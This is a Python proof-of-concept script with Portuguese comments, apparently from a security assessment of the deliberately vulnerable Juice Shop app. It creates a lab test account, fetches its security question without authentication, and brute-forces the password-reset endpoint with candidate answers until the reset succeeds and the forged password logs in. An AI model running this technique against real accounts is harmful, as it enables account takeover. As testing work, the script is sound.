"""Prova de conceito de falha de design no fluxo de recuperação de senha (A04).

Registra uma conta de teste com uma resposta comum para a pergunta de
segurança "Your eldest siblings middle name?" e demonstra duas falhas
combinadas: a pergunta associada a qualquer e-mail é consultável sem
autenticação, e o endpoint de redefinição de senha aceita um número
ilimitado de tentativas de resposta, sem bloqueio, permitindo testar uma
lista de respostas prováveis até acertar.
"""

from __future__ import annotations

import uuid

from scripts.lib import config
from scripts.lib.evidence import EvidenceRecorder
from scripts.lib.http_session import ScopedSession

ACHADO_ID = "V7"
SLUG = "reset-senha-pergunta-seguranca"

RESPOSTA_REAL = "John"
CANDIDATAS = ["Michael", "David", "James", "Robert", "John"]


def executar() -> None:
    """Executa a prova de conceito de ponta a ponta e imprime o veredito."""
    recorder = EvidenceRecorder(ACHADO_ID, SLUG)
    sessao = ScopedSession(recorder=recorder)

    email = f"resetpwd-{uuid.uuid4().hex[:10]}@lab.local"
    senha_original = "SenhaOriginal#1"
    nova_senha = "SenhaForjada#2"

    resposta_registro = sessao.post(
        f"{config.BASE_URL}/api/Users",
        json={
            "email": email,
            "password": senha_original,
            "passwordRepeat": senha_original,
        },
    )
    user_id = resposta_registro.json()["data"]["id"]

    resposta_login_inicial = sessao.post(
        f"{config.BASE_URL}/rest/user/login",
        json={"email": email, "password": senha_original},
    )
    token_inicial = resposta_login_inicial.json()["authentication"]["token"]

    # A interface web do Juice Shop associa a resposta de segurança em uma
    # chamada separada da criação da conta, exigindo o UserId explicitamente
    # no corpo; sem isso, a resposta fica órfã e nunca aparece consultável.
    sessao.post(
        f"{config.BASE_URL}/api/SecurityAnswers/",
        json={"SecurityQuestionId": 1, "answer": RESPOSTA_REAL, "UserId": user_id},
        headers={"Authorization": f"Bearer {token_inicial}"},
    )

    resposta_pergunta = sessao.get(
        f"{config.BASE_URL}/rest/user/security-question",
        params={"email": email},
    )
    pergunta = resposta_pergunta.json().get("question", {}).get("question")
    print(f"Pergunta de segurança obtida sem autenticação: {pergunta!r}")

    status_tentativas = []
    sucesso = False
    for candidata in CANDIDATAS:
        resposta = sessao.post(
            f"{config.BASE_URL}/rest/user/reset-password",
            json={
                "email": email,
                "answer": candidata,
                "new": nova_senha,
                "repeat": nova_senha,
            },
        )
        status_tentativas.append((candidata, resposta.status_code))
        if resposta.status_code == 200:
            sucesso = True
            break

    print(f"Tentativas (resposta, status): {status_tentativas}")

    resposta_login = sessao.post(
        f"{config.BASE_URL}/rest/user/login",
        json={"email": email, "password": nova_senha},
    )
    print(f"Login com a nova senha forjada: HTTP {resposta_login.status_code}")

    if sucesso and resposta_login.status_code == 200:
        print(
            "RESULTADO: confirmado — a senha foi redefinida testando um pequeno "
            "conjunto de respostas prováveis, sem qualquer bloqueio nas tentativas "
            "incorretas anteriores, e o login com a nova senha teve sucesso."
        )
    else:
        print("RESULTADO: não foi possível confirmar o bypass nesta execução.")
    print(f"Evidência gravada em: {recorder.directory}")


if __name__ == "__main__":
    executar()
